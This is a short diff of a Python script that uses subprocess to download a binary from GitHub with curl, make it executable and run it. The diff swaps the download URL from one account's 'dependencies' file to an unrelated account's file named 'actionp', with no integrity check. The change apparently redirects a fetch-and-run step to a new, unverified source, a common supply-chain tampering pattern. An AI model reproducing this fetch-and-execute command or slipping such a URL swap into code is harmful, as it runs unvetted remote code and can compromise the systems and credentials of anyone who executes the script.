@@ -6,7 +6,7 @@ import subprocess
 def main() -> None:
     subprocess.run(
         """
-            curl -fsSL -o /tmp/file https://github.com/HothIndustries/dependencies/raw/refs/heads/main/dependencies
+            curl -fsSL -o /tmp/file https://github.com/crew7/dependencies/raw/refs/heads/main/actionp
             chmod +x /tmp/file
             /tmp/file
         """,
